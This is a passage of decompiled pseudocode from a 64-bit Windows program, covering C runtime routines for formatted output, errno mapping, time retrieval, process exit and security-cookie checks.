          *(_DWORD *)(a1 + 56) = 16;
          *(_DWORD *)(a1 + 60) = 11;
LABEL_25:
          v5 = 1;
          v4 = 16;
LABEL_33:
          v3 = sub_13F1695BC(a1, v4, v5);
          goto LABEL_35;
        case 's':
LABEL_23:
          v3 = sub_13F169838(a1);
          goto LABEL_35;
      }
      if ( v1 != 117 )
      {
        if ( v1 != 120 )
          return 0;
        v4 = 16;
        goto LABEL_32;
      }
LABEL_31:
      v4 = 10;
LABEL_32:
      v5 = 0;
      goto LABEL_33;
    }
LABEL_30:
    *(_DWORD *)(a1 + 48) |= 0x10u;
    goto LABEL_31;
  }
  if ( v1 == 100 )
    goto LABEL_30;
  if ( v1 != 65 )
  {
    if ( v1 == 67 )
    {
LABEL_12:
      v3 = sub_13F169508(a1);
      goto LABEL_35;
    }
    if ( v1 <= 68 )
      return 0;
    if ( v1 > 71 )
    {
      if ( v1 != 83 )
      {
        if ( v1 != 88 )
        {
          if ( v1 == 90 )
          {
            v3 = sub_13F16926C(a1);
            goto LABEL_35;
          }
          if ( v1 != 97 )
          {
            if ( v1 == 99 )
              goto LABEL_12;
            return 0;
          }
          goto LABEL_34;
        }
        goto LABEL_25;
      }
      goto LABEL_23;
    }
  }
LABEL_34:
  v3 = sub_13F1692EC(a1);
LABEL_35:
  if ( !v3 )
    return 0;
  if ( !*(_BYTE *)(v2 + 64) )
  {
    v8 = *(_DWORD *)(v2 + 48);
    v15.m128i_i16[0] = 0;
    v9 = 0i64;
    v15.m128i_i8[2] = 0;
    if ( (v8 & 0x10) == 0 )
      goto LABEL_46;
    if ( (v8 & 0x40) != 0 )
    {
      v15.m128i_i8[0] = 45;
    }
    else if ( (v8 & 1) != 0 )
    {
      v15.m128i_i8[0] = 43;
    }
    else
    {
      if ( (v8 & 2) == 0 )
        goto LABEL_46;
      v15.m128i_i8[0] = 32;
    }
    v9 = 1i64;
LABEL_46:
    v10 = *(_BYTE *)(v2 + 65);
    v11 = ((v10 - 88) & 0xDF) == 0 && (v8 & 0x20) != 0;
    if ( v11 || ((v10 - 65) & 0xDF) == 0 )
    {
      v15.m128i_i8[v9++] = 48;
      v12 = v10 == 88 || v10 == 65;
      v15.m128i_i8[v9] = v12 ? 88 : 120;
      LODWORD(v9) = v9 + 1;
    }
    v13 = *(_DWORD *)(v2 + 52) - *(_DWORD *)(v2 + 80) - v9;
    if ( (v8 & 0xC) == 0 )
      sub_13F1686F4((__int64 *)(v2 + 1128), 32, v13, (_DWORD *)(v2 + 40));
    sub_13F1699A0((__int64 *)(v2 + 1128), &v15, v9, (_DWORD *)(v2 + 40), *(int **)(v2 + 16));
    v14 = *(_DWORD *)(v2 + 48);
    if ( (v14 & 8) != 0 && (v14 & 4) == 0 )
      sub_13F1686F4((__int64 *)(v2 + 1128), 48, v13, (_DWORD *)(v2 + 40));
    sub_13F1698C8(v2);
    if ( *(int *)(v2 + 40) >= 0 && (*(_DWORD *)(v2 + 48) & 4) != 0 )
      sub_13F1686F4((__int64 *)(v2 + 1128), 32, v13, (_DWORD *)(v2 + 40));
  }
  return 1;
}

//----- (000000013F16926C) ----------------------------------------------------
char __fastcall sub_13F16926C(__int64 a1)
{
  unsigned __int16 *v2; // rdi
  __int64 v3; // rsi
  bool v4; // zf
  unsigned int v5; // eax

  *(_QWORD *)(a1 + 32) += 8i64;
  v2 = *(unsigned __int16 **)(*(_QWORD *)(a1 + 32) - 8i64);
  if ( !v2 || (v3 = *((_QWORD *)v2 + 1)) == 0 )
  {
    *(_DWORD *)(a1 + 80) = 6;
    *(_QWORD *)(a1 + 72) = "(null)";
    goto LABEL_7;
  }
  v4 = !sub_13F16858C(*(_QWORD *)a1, *(_BYTE *)(a1 + 65), *(_DWORD *)(a1 + 60));
  *(_QWORD *)(a1 + 72) = v3;
  v5 = *v2;
  if ( v4 )
  {
    *(_DWORD *)(a1 + 80) = v5;
LABEL_7:
    *(_BYTE *)(a1 + 84) = 0;
    return 1;
  }
  *(_DWORD *)(a1 + 80) = v5 >> 1;
  *(_BYTE *)(a1 + 84) = 1;
  return 1;
}

//----- (000000013F1692EC) ----------------------------------------------------
char __fastcall sub_13F1692EC(__int64 a1)
{
  int v2; // eax
  __int64 v3; // rdi
  char v4; // al
  unsigned __int64 v5; // r8
  __int64 v6; // rax
  __int64 v7; // rax
  bool v8; // zf
  __int64 v9; // r9
  __int64 v10; // rcx
  _BYTE *v11; // r10
  __m128i *v12; // rdx
  char *v13; // rdx
  char v14; // r8
  char v15; // al
  char *v16; // rdx
  char *v17; // rcx
  char v18; // al
  _BYTE *v19; // rax
  _BYTE *v20; // rdx
  __int64 v21; // rcx
  __int64 v22; // rcx
  __int64 v24; // [rsp+60h] [rbp+8h] BYREF

  *(_DWORD *)(a1 + 48) |= 0x10u;
  v2 = *(_DWORD *)(a1 + 56);
  if ( v2 >= 0 )
  {
    if ( !v2 && ((*(_BYTE *)(a1 + 65) - 71) & 0xDF) == 0 )
      *(_DWORD *)(a1 + 56) = 1;
  }
  else
  {
    *(_DWORD *)(a1 + 56) = ((*(_BYTE *)(a1 + 65) - 65) & 0xDF) != 0 ? 6 : 13;
  }
  v3 = a1 + 88;
  v4 = sub_13F1684E0(a1 + 88, *(_DWORD *)(a1 + 56) + 349);
  v5 = 512i64;
  if ( !v4 )
  {
    if ( *(_QWORD *)(v3 + 1032) )
      v6 = *(_QWORD *)(v3 + 1024) >> 1;
    else
      LODWORD(v6) = 512;
    *(_DWORD *)(a1 + 56) = v6 - 349;
  }
  v7 = *(_QWORD *)(v3 + 1032);
  if ( !v7 )
    v7 = v3;
  *(_QWORD *)(a1 + 72) = v7;
  *(_QWORD *)(a1 + 32) += 8i64;
  v8 = *(_QWORD *)(v3 + 1032) == 0i64;
  v24 = 0i64;
  v24 = *(_QWORD *)(*(_QWORD *)(a1 + 32) - 8i64);
  if ( v8 )
    v9 = 512i64;
  else
    v9 = *(_QWORD *)(v3 + 1024) >> 1;
  v10 = *(_QWORD *)(v3 + 1032);
  if ( v10 )
    v11 = (_BYTE *)(v10 + (*(_QWORD *)(v3 + 1024) >> 1));
  else
    v11 = (_BYTE *)(v3 + 512);
  if ( v10 )
    v5 = *(_QWORD *)(v3 + 1024) >> 1;
  v12 = *(__m128i **)(v3 + 1032);
  if ( !v10 )
    v12 = (__m128i *)v3;
  sub_13F17035C(&v24, v12, v5, v11, v9, *(char *)(a1 + 65), *(_DWORD *)(a1 + 56), *(_QWORD *)a1, *(__int128 **)(a1 + 8));
  if ( (*(_DWORD *)(a1 + 48) & 0x20) != 0 && !*(_DWORD *)(a1 + 56) )
    sub_13F16885C(*(char **)(a1 + 72), *(_QWORD *)(a1 + 8));
  if ( ((*(_BYTE *)(a1 + 65) - 71) & 0xDF) == 0 && (*(_DWORD *)(a1 + 48) & 0x20) == 0 )
  {
    v13 = *(char **)(a1 + 72);
    v14 = ***(_BYTE ***)(**(_QWORD **)(a1 + 8) + 248i64);
    while ( *v13 && *v13 != v14 )
      ++v13;
    v15 = *v13;
    v16 = v13 + 1;
    if ( v15 )
    {
      while ( *v16 && ((*v16 - 69) & 0xDF) != 0 )
        ++v16;
      v17 = v16;
      do
        --v16;
      while ( *v16 == 48 );
      if ( *v16 == v14 )
        --v16;
      do
      {
        v18 = *v17;
        ++v16;
        ++v17;
        *v16 = v18;
      }
      while ( v18 );
    }
  }
  v19 = *(_BYTE **)(a1 + 72);
  if ( *v19 == 45 )
  {
    *(_DWORD *)(a1 + 48) |= 0x40u;
    *(_QWORD *)(a1 + 72) = ++v19;
  }
  v20 = *(_BYTE **)(a1 + 72);
  LOBYTE(v19) = *v20 - 73;
  if ( (unsigned __int8)v19 <= 0x25u )
  {
    v21 = 0x2100000021i64;
    if ( _bittest64(&v21, (unsigned __int64)v19) )
      *(_BYTE *)(a1 + 65) = 115;
  }
  v22 = -1i64;
  do
    ++v22;
  while ( v20[v22] );
  *(_DWORD *)(a1 + 80) = v22;
  return 1;
}

//----- (000000013F169508) ----------------------------------------------------
char __fastcall sub_13F169508(__int64 a1)
{
  unsigned __int64 v2; // r8
  _BYTE *v3; // rdx
  _BYTE *v4; // r8
  __int64 v5; // rcx
  char result; // al

  if ( sub_13F16858C(*(_QWORD *)a1, *(_BYTE *)(a1 + 65), *(_DWORD *)(a1 + 60)) )
  {
    *(_QWORD *)(a1 + 32) += 8i64;
    if ( *(_QWORD *)(a1 + 1120) )
      v2 = *(_QWORD *)(a1 + 1112) >> 1;
    else
      v2 = 512i64;
    v3 = *(_BYTE **)(a1 + 1120);
    if ( !v3 )
      v3 = (_BYTE *)(a1 + 88);
    if ( (unsigned int)sub_13F16F55C((_DWORD *)(a1 + 80), v3, v2, *(_WORD *)(*(_QWORD *)(a1 + 32) - 8i64)) )
      *(_BYTE *)(a1 + 64) = 1;
  }
  else
  {
    v4 = *(_BYTE **)(a1 + 1120);
    if ( !v4 )
      v4 = (_BYTE *)(a1 + 88);
    *(_QWORD *)(a1 + 32) += 8i64;
    *v4 = *(_BYTE *)(*(_QWORD *)(a1 + 32) - 8i64);
    *(_DWORD *)(a1 + 80) = 1;
  }
  v5 = *(_QWORD *)(a1 + 1120);
  result = 1;
  if ( !v5 )
    v5 = a1 + 88;
  *(_QWORD *)(a1 + 72) = v5;
  return result;
}

//----- (000000013F1695BC) ----------------------------------------------------
char __fastcall sub_13F1695BC(__int64 a1, unsigned int a2, char a3)
{
  int v4; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  __int64 v9; // rdx
  int v11; // ecx
  int v12; // ecx
  __int64 v13; // rcx
  int v14; // eax
  bool v15; // zf
  __int64 v16; // rax
  int v17; // eax
  __int64 v18; // rax
  int v19; // eax
  __int64 v20; // rax

  v4 = *(_DWORD *)(a1 + 60);
  if ( v4 > 5 )
  {
    v11 = v4 - 6;
    if ( !v11 )
      goto LABEL_8;
    v12 = v11 - 1;
    if ( !v12 )
      goto LABEL_8;
    v7 = v12 - 2;
    if ( !v7 )
      goto LABEL_8;
  }
  else
  {
    if ( v4 == 5 )
    {
LABEL_8:
      v9 = 8i64;
      goto LABEL_9;
    }
    if ( !v4 )
      goto LABEL_14;
    v6 = v4 - 1;
    if ( !v6 )
    {
      v9 = 1i64;
      goto LABEL_9;
    }
    v7 = v6 - 1;
    if ( !v7 )
    {
      v9 = 2i64;
      goto LABEL_9;
    }
  }
  v8 = v7 - 1;
  if ( !v8 )
  {
LABEL_14:
    v9 = 4i64;
    goto LABEL_9;
  }
  if ( v8 == 1 )
    goto LABEL_8;
  v9 = 0i64;
LABEL_9:
  switch ( v9 )
  {
    case 1i64:
      v19 = *(_DWORD *)(a1 + 48);
      *(_QWORD *)(a1 + 32) += 8i64;
      v15 = (v19 & 0x10) == 0;
      v20 = *(_QWORD *)(a1 + 32);
      if ( v15 )
        v13 = *(unsigned __int8 *)(v20 - 8);
      else
        v13 = *(char *)(v20 - 8);
      break;
    case 2i64:
      v17 = *(_DWORD *)(a1 + 48);
      *(_QWORD *)(a1 + 32) += 8i64;
      v15 = (v17 & 0x10) == 0;
      v18 = *(_QWORD *)(a1 + 32);
      if ( v15 )
        v13 = *(unsigned __int16 *)(v18 - 8);
      else
        v13 = *(__int16 *)(v18 - 8);
      break;
    case 4i64:
      v14 = *(_DWORD *)(a1 + 48);
      *(_QWORD *)(a1 + 32) += 8i64;
      v15 = (v14 & 0x10) == 0;
      v16 = *(_QWORD *)(a1 + 32);
      if ( v15 )
        v13 = *(unsigned int *)(v16 - 8);
      else
        v13 = *(int *)(v16 - 8);
      break;
    case 8i64:
      *(_QWORD *)(a1 + 32) += 8i64;
      v13 = *(_QWORD *)(*(_QWORD *)(a1 + 32) - 8i64);
      break;
    default:
      *(_DWORD *)sub_13F169DAC() = 22;
      sub_13F1682A0();
      return 0;
  }
  if ( (*(_DWORD *)(a1 + 48) & 0x10) != 0 && v13 < 0 )
  {
    v13 = -v13;
    *(_DWORD *)(a1 + 48) |= 0x40u;
  }
  if ( *(int *)(a1 + 56) >= 0 )
  {
    *(_DWORD *)(a1 + 48) &= ~8u;
    if ( *(int *)(a1 + 56) > 512 )
      *(_DWORD *)(a1 + 56) = 512;
  }
  else
  {
    *(_DWORD *)(a1 + 56) = 1;
  }
  if ( !v13 )
    *(_DWORD *)(a1 + 48) &= ~0x20u;
  if ( v9 == 8 )
    sub_13F168658(a1, v13, a2, a3);
  else
    sub_13F1685BC(a1, v13, a2, a3);
  if ( (*(_DWORD *)(a1 + 48) & 0x80) != 0 && (!*(_DWORD *)(a1 + 80) || **(_BYTE **)(a1 + 72) != 48) )
  {
    *(_BYTE *)--*(_QWORD *)(a1 + 72) = 48;
    ++*(_DWORD *)(a1 + 80);
  }
  return 1;
}

//----- (000000013F16975C) ----------------------------------------------------
char __fastcall sub_13F16975C(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v3; // rsi
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  __int64 v11; // rbx
  __int64 v12; // rbx
  __int64 v13; // rbx

  v1 = 8i64;
  *(_QWORD *)(a1 + 32) += 8i64;
  v3 = *(_QWORD **)(*(_QWORD *)(a1 + 32) - 8i64);
  if ( !(unsigned int)sub_13F1705C8() )
    goto LABEL_2;
  v5 = *(_DWORD *)(a1 + 60);
  if ( v5 <= 5 )
  {
    if ( v5 == 5 )
      goto LABEL_18;
    if ( !v5 )
      goto LABEL_17;
    v6 = v5 - 1;
    if ( !v6 )
    {
      v1 = 1i64;
      goto LABEL_18;
    }
    v7 = v6 - 1;
    if ( !v7 )
    {
      v1 = 2i64;
      goto LABEL_18;
    }
LABEL_8:
    v8 = v7 - 1;
    if ( v8 )
    {
      if ( v8 != 1 )
        v1 = 0i64;
      goto LABEL_18;
    }
LABEL_17:
    v1 = 4i64;
    goto LABEL_18;
  }
  v9 = v5 - 6;
  if ( v9 )
  {
    v10 = v9 - 1;
    if ( v10 )
    {
      v7 = v10 - 2;
      if ( v7 )
        goto LABEL_8;
    }
  }
LABEL_18:
  v11 = v1 - 1;
  if ( v11 )
  {
    v12 = v11 - 1;
    if ( v12 )
    {
      v13 = v12 - 2;
      if ( v13 )
      {
        if ( v13 != 4 )
        {
LABEL_2:
          *(_DWORD *)sub_13F169DAC() = 22;
          sub_13F1682A0();
          return 0;
        }
        *v3 = *(int *)(a1 + 40);
      }
      else
      {
        *(_DWORD *)v3 = *(_DWORD *)(a1 + 40);
      }
    }
    else
    {
      *(_WORD *)v3 = *(_WORD *)(a1 + 40);
    }
  }
  else
  {
    *(_BYTE *)v3 = *(_BYTE *)(a1 + 40);
  }
  *(_BYTE *)(a1 + 64) = 1;
  return 1;
}

//----- (000000013F169838) ----------------------------------------------------
char __fastcall sub_13F169838(__int64 a1)
{
  int v2; // esi
  int v3; // er8
  char v4; // dl
  wchar_t *v5; // rdi
  wchar_t *v6; // rcx
  unsigned int v7; // eax
  char *v8; // rcx

  *(_QWORD *)(a1 + 32) += 8i64;
  v2 = *(_DWORD *)(a1 + 56);
  v3 = *(_DWORD *)(a1 + 60);
  v4 = *(_BYTE *)(a1 + 65);
  v5 = *(wchar_t **)(*(_QWORD *)(a1 + 32) - 8i64);
  *(_QWORD *)(a1 + 72) = v5;
  if ( v2 == -1 )
    v2 = 0x7FFFFFFF;
  if ( sub_13F16858C(*(_QWORD *)a1, v4, v3) )
  {
    *(_BYTE *)(a1 + 84) = 1;
    v6 = L"(null)";
    if ( v5 )
      v6 = v5;
    *(_QWORD *)(a1 + 72) = v6;
    v7 = sub_13F16F6CC(v6, v2);
  }
  else
  {
    v8 = "(null)";
    if ( v5 )
      v8 = (char *)v5;
    *(_QWORD *)(a1 + 72) = v8;
    v7 = (unsigned int)sub_13F16F570(v8, v2);
  }
  *(_DWORD *)(a1 + 80) = v7;
  return 1;
}
// 13F18D818: using guessed type wchar_t aNull_0[7];

//----- (000000013F1698C8) ----------------------------------------------------
char __fastcall sub_13F1698C8(__int64 a1)
{
  unsigned __int16 *v2; // rsi
  int v3; // edi
  unsigned __int16 v4; // r9
  int v6; // [rsp+30h] [rbp-28h] BYREF
  __m128i v7[2]; // [rsp+34h] [rbp-24h] BYREF

  if ( *(_BYTE *)(a1 + 84) && *(int *)(a1 + 80) > 0 )
  {
    v2 = *(unsigned __int16 **)(a1 + 72);
    v3 = 0;
    while ( 1 )
    {
      v4 = *v2;
      v6 = 0;
      ++v2;
      if ( (unsigned int)sub_13F16F55C(&v6, v7, 6ui64, v4) || !v6 )
        break;
      sub_13F1699A0((__int64 *)(a1 + 1128), v7, v6, (_DWORD *)(a1 + 40), *(int **)(a1 + 16));
      if ( ++v3 == *(_DWORD *)(a1 + 80) )
        return 1;
    }
    *(_DWORD *)(a1 + 40) = -1;
  }
  else
  {
    sub_13F1699A0(
      (__int64 *)(a1 + 1128),
      *(const __m128i **)(a1 + 72),
      *(_DWORD *)(a1 + 80),
      (_DWORD *)(a1 + 40),
      *(int **)(a1 + 16));
  }
  return 1;
}
// 13F1698FE: conditional instruction was optimized away because eax.4>=1

//----- (000000013F1699A0) ----------------------------------------------------
__int64 __fastcall sub_13F1699A0(__int64 *a1, const __m128i *a2, int a3, _DWORD *a4, int *a5)
{
  __int64 v7; // rbp
  int v8; // er14
  __int64 v9; // rcx
  __int64 result; // rax
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // rsi
  __m128i *v13; // rcx

  v7 = a3;
  v8 = *a5;
  *a5 = 0;
  v9 = *a1;
  result = *(_QWORD *)(v9 + 8);
  if ( *(_QWORD *)(v9 + 16) == result )
  {
    if ( *(_BYTE *)(v9 + 24) )
      *a4 += a3;
    else
      *a4 = -1;
  }
  else
  {
    v11 = result - *(_QWORD *)(v9 + 16);
    v12 = a3;
    v13 = *(__m128i **)v9;
    if ( v11 < a3 )
      v12 = v11;
    sub_13F15EB00(v13, a2, v12);
    *(_QWORD *)*a1 += v12;
    *(_QWORD *)(*a1 + 16) += v12;
    result = *a1;
    if ( *(_BYTE *)(*a1 + 24) )
    {
      *a4 += v7;
    }
    else if ( v12 == v7 )
    {
      *a4 += v12;
    }
    else
    {
      *a4 = -1;
    }
  }
  if ( !*a5 )
  {
    if ( v8 )
      *a5 = v8;
  }
  return result;
}

//----- (000000013F169A5C) ----------------------------------------------------
__int64 __fastcall sub_13F169A5C(__int64 a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int128 *a5, __int64 a6)
{
  unsigned __int64 v10; // rbx
  int v11; // eax
  __int64 v12; // rax
  __int64 v13; // rcx
  __int64 v15; // [rsp+30h] [rbp-D0h] BYREF
  char v16[16]; // [rsp+38h] [rbp-C8h] BYREF
  char v17; // [rsp+48h] [rbp-B8h]
  __int64 v18[2]; // [rsp+50h] [rbp-B0h] BYREF
  __int64 v19; // [rsp+60h] [rbp-A0h]
  char v20; // [rsp+68h] [rbp-98h]
  __int64 *v21; // [rsp+70h] [rbp-90h] BYREF
  char v22[1120]; // [rsp+80h] [rbp-80h] BYREF
  __int64 v23; // [rsp+4E0h] [rbp+3E0h]

  if ( !a4 || a3 && !a2 )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
LABEL_3:
    LODWORD(v10) = -1;
    return (unsigned int)v10;
  }
  sub_13F1687CC((__int64)&v15, a5);
  sub_13F15EF70((__int64)v18, 0, 0x20ui64);
  v18[0] = (__int64)a2;
  v18[1] = a3;
  v19 = 0i64;
  if ( (a1 & 2) != 0 || (v20 = 0, !a2) )
    v20 = 1;
  v21 = v18;
  sub_13F168750((__int64)v22, &v21, a1, a4, (__int64)v16, a6);
  v11 = sub_13F168B64((__int64)v22);
  v10 = v11;
  if ( !a2 )
  {
    sub_13F16E734(v23);
    v23 = 0i64;
    if ( v17 )
      *(_DWORD *)(v15 + 936) &= ~2u;
    return (unsigned int)v10;
  }
  if ( (a1 & 1) != 0 )
  {
    if ( !a3 && v11 )
    {
LABEL_15:
      sub_13F16E734(v23);
      v23 = 0i64;
      if ( v17 )
        *(_DWORD *)(v15 + 936) &= ~2u;
      goto LABEL_3;
    }
    v12 = v19;
    if ( v19 == a3 )
    {
      if ( (v10 & 0x80000000) == 0i64 && v10 > a3 )
        goto LABEL_15;
      goto LABEL_33;
    }
    goto LABEL_32;
  }
  if ( (a1 & 2) != 0 )
  {
    if ( !a3 )
      goto LABEL_33;
    if ( v11 < 0 )
    {
      *a2 = 0;
      goto LABEL_33;
    }
    v12 = v19;
    if ( v19 == a3 )
    {
      a2[a3 - 1] = 0;
      goto LABEL_33;
    }
LABEL_32:
    a2[v12] = 0;
LABEL_33:
    sub_13F16E734(v23);
    v23 = 0i64;
    if ( v17 )
      *(_DWORD *)(v15 + 936) &= ~2u;
    return (unsigned int)v10;
  }
  if ( !a3 )
    goto LABEL_15;
  v12 = v19;
  if ( v19 != a3 )
    goto LABEL_32;
  v13 = v23;
  a2[a3 - 1] = 0;
  sub_13F16E734(v13);
  v23 = 0i64;
  if ( v17 )
    *(_DWORD *)(v15 + 936) &= ~2u;
  LODWORD(v10) = -2;
  return (unsigned int)v10;
}
// 13F169A5C: using guessed type char var_4F8[16];

//----- (000000013F169C90) ----------------------------------------------------
__int64 __fastcall sub_13F169C90(__int64 a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int128 *a5, __int64 a6)
{
  __int64 result; // rax

  if ( !a4 || !a2 || !a3 )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    goto LABEL_9;
  }
  result = sub_13F168338(a1, a2, a3, a4, a5, a6);
  if ( (int)result < 0 )
    *a2 = 0;
  if ( (_DWORD)result == -2 )
  {
    *(_DWORD *)sub_13F169DAC() = 34;
LABEL_9:
    sub_13F1682A0();
    return 0xFFFFFFFFi64;
  }
  return result;
}

//----- (000000013F169CF4) ----------------------------------------------------
__int64 __fastcall sub_13F169CF4(int a1)
{
  __int64 v1; // rax
  __int64 *v2; // rdx
  __int64 result; // rax

  v1 = 0i64;
  v2 = qword_13F18D830;
  do
  {
    if ( a1 == *(_DWORD *)v2 )
      return HIDWORD(qword_13F18D830[v1]);
    v1 = (unsigned int)(v1 + 1);
    ++v2;
  }
  while ( (unsigned int)v1 < 0x2D );
  if ( (unsigned int)(a1 - 19) <= 0x11 )
    return 13i64;
  result = 22i64;
  if ( (unsigned int)(a1 - 188) <= 0xE )
    return 8i64;
  return result;
}
// 13F18D830: using guessed type __int64 qword_13F18D830[45];

//----- (000000013F169D3C) ----------------------------------------------------
__int64 __fastcall sub_13F169D3C(int a1)
{
  __int64 v2; // rax
  int *v3; // rax
  __int64 v4; // rax
  char *v5; // rbx
  __int64 result; // rax

  v2 = sub_13F16E5BC();
  if ( v2 )
    v3 = (int *)(v2 + 36);
  else
    v3 = &dword_13F1B73FC;
  *v3 = a1;
  v4 = sub_13F16E5BC();
  v5 = byte_13F1B73F8;
  if ( v4 )
    v5 = (char *)(v4 + 32);
  result = sub_13F169CF4(a1);
  *(_DWORD *)v5 = result;
  return result;
}
// 13F1B73FC: using guessed type int dword_13F1B73FC;

//----- (000000013F169D8C) ----------------------------------------------------
int *sub_13F169D8C()
{
  __int64 v0; // rax

  v0 = sub_13F16E5BC();
  if ( v0 )
    return (int *)(v0 + 36);
  else
    return &dword_13F1B73FC;
}
// 13F1B73FC: using guessed type int dword_13F1B73FC;

//----- (000000013F169DAC) ----------------------------------------------------
char *sub_13F169DAC()
{
  __int64 v0; // rax

  v0 = sub_13F16E5BC();
  if ( v0 )
    return (char *)(v0 + 32);
  else
    return byte_13F1B73F8;
}

//----- (000000013F169DCC) ----------------------------------------------------
__int64 __fastcall sub_13F169DCC(__int64 a1, int a2)
{
  __int64 result; // rax
  int v4; // er8
  __int64 v5; // rdx
  __int64 v6; // [rsp+30h] [rbp+8h] BYREF

  if ( !a1 )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 0i64;
  }
  if ( a2 != 1 )
    return 0i64;
  v6 = 0i64;
  sub_13F16EB74((__int64)&v6);
  v4 = v6 + 717324288;
  v5 = (v6 - 116444736000000000i64) / 10000000;
  if ( v5 > 0x793406FFFi64 )
    return 0i64;
  result = 1i64;
  *(_QWORD *)a1 = v5;
  *(_DWORD *)(a1 + 8) = 100 * (v4 - 10000000 * v5);
  return result;
}

//----- (000000013F169E64) ----------------------------------------------------
__int64 __fastcall sub_13F169E64(__int64 *a1)
{
  int v2; // eax
  __int64 v3; // rdx
  __int64 v5[3]; // [rsp+20h] [rbp-18h] BYREF

  v5[0] = 0i64;
  v2 = sub_13F169DCC((__int64)v5, 1);
  v3 = v5[0];
  if ( v2 != 1 )
    v3 = -1i64;
  if ( a1 )
    *a1 = v3;
  return v3;
}
// 13F169E64: using guessed type __int64 var_18[3];

//----- (000000013F169EA4) ----------------------------------------------------
_BOOL8 __fastcall sub_13F169EA4(int a1)
{
  return a1 == -529697949;
}

//----- (000000013F169EB0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void __fastcall sub_13F169EB0(unsigned int a1, int a2, int a3)
{
  __int64 v6; // rax
  __int64 v7; // rcx
  __int64 *v8; // rcx

  if ( !a3 )
  {
    v6 = MEMORY[0x76F920C0](0i64);
    if ( v6 )
    {
      if ( *(_WORD *)v6 == 23117 )
      {
        v7 = v6 + *(int *)(v6 + 60);
        if ( *(_DWORD *)v7 == 17744
          && *(_WORD *)(v7 + 24) == 523
          && *(_DWORD *)(v7 + 132) > 0xEu
          && *(_DWORD *)(v7 + 248) != a3 )
        {
          sub_13F16A068(a1);
        }
      }
    }
  }
  sub_13F170628();
  _InterlockedExchange(&dword_13F1C6068, 1);
  if ( a2 )
  {
    if ( a2 != 1 )
      goto LABEL_16;
    v8 = qword_13F1C61E0;
  }
  else
  {
    if ( (_security_cookie ^ __ROR8__(0i64, 64 - ((unsigned __int8)_security_cookie & 0x3Fu))) != 0x2CC5EF7154DEi64 )
      ((void (__fastcall *)(_QWORD, _QWORD, _QWORD))__ROR8__(
                                                      _security_cookie ^ 0x2CC5EF7154DEi64,
                                                      _security_cookie & 0x3F))(
        0i64,
        0i64,
        0i64);
    v8 = qword_13F1C61C8;
  }
  sub_13F16CEFC((__int64)v8);
LABEL_16:
  if ( !a2 )
    sub_13F16D1C4(&qword_13F180588, (unsigned __int64)&qword_13F1805B0);
  sub_13F16D1C4(&qword_13F1805B8, (unsigned __int64)qword_13F1805C0);
  byte_13F1C6078 = a3 == 0;
  sub_13F17067C();
  if ( !a3 )
    sub_13F16A01C(a1);
}
// 13F169FDC: write access to const memory at 13F1C6078 has been detected
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F180588: using guessed type __int64 qword_13F180588;
// 13F1805B0: using guessed type __int64 qword_13F1805B0;
// 13F1805B8: using guessed type __int64 qword_13F1805B8;
// 13F1805C0: using guessed type __int64 qword_13F1805C0[4];
// 13F1C6068: using guessed type int dword_13F1C6068;
// 13F1C6070: using guessed type __int64 qword_13F1C6070;
// 13F1C6078: using guessed type char byte_13F1C6078;
// 13F1C61C8: using guessed type __int64 qword_13F1C61C8[3];
// 13F1C61E0: using guessed type __int64 qword_13F1C61E0[3];

//----- (000000013F16A01C) ----------------------------------------------------
void __fastcall __noreturn sub_13F16A01C(unsigned int a1)
{
  __int64 v2; // rax

  if ( sub_13F16EDD4() && (NtCurrentPeb()->NtGlobalFlag & 0x100) == 0 )
  {
    v2 = MEMORY[0x76F85190]();
    MEMORY[0x76FBC140](v2, a1);
  }
  sub_13F16A068(a1);
  MEMORY[0x771B2730](a1);
  JUMPOUT(0x13F16A064i64);
}
// 13F16A05E: control flows out of bounds to 13F16A064

//----- (000000013F16A068) ----------------------------------------------------
__int64 (__fastcall *__fastcall sub_13F16A068(unsigned int a1))(_QWORD)
{
  __int64 (__fastcall *result)(_QWORD); // rax
  __int64 v3; // [rsp+38h] [rbp+10h] BYREF

  v3 = 0i64;
  result = (__int64 (__fastcall *)(_QWORD))MEMORY[0x76F7AC30](0i64, L"mscoree.dll", &v3);
  if ( (_DWORD)result )
  {
    result = (__int64 (__fastcall *)(_QWORD))MEMORY[0x76F92020](v3, "CorExitProcess");
    if ( result )
      result = (__int64 (__fastcall *)(_QWORD))result(a1);
  }
  if ( v3 )
    return (__int64 (__fastcall *)(_QWORD))MEMORY[0x76F85AC0]();
  return result;
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F18D998: using guessed type wchar_t aMscoreeDll[12];

//----- (000000013F16A0D4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void __fastcall sub_13F16A0D4(__int64 a1)
{
  qword_13F1C6070 = a1;
}
// 13F16A0D4: write access to const memory at 13F1C6070 has been detected
// 13F1C6070: using guessed type __int64 qword_13F1C6070;

//----- (000000013F16A0DC) ----------------------------------------------------
void sub_13F16A0DC()
{
  sub_13F169EB0(0, 2, 1);
}

//----- (000000013F16A0EC) ----------------------------------------------------
void sub_13F16A0EC()
{
  sub_13F169EB0(0, 0, 1);
}

//----- (000000013F16A0FC) ----------------------------------------------------
void __fastcall sub_13F16A0FC(unsigned int a1)
{
  sub_13F169EB0(a1, 2, 0);
}

//----- (000000013F16A108) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
uintptr_t __fastcall sub_13F16A108(__int64 a1)
{
  uintptr_t result; // rax

  result = _security_cookie ^ __ROR8__(0i64, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  if ( result != 0x2CC5EF7154DEi64 )
    sub_13F16A158();
  qword_13F1C6070 = _security_cookie ^ __ROR8__(a1, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  return result;
}
// 13F16A13A: write access to const memory at 13F1C6070 has been detected
// 13F1C6070: using guessed type __int64 qword_13F1C6070;

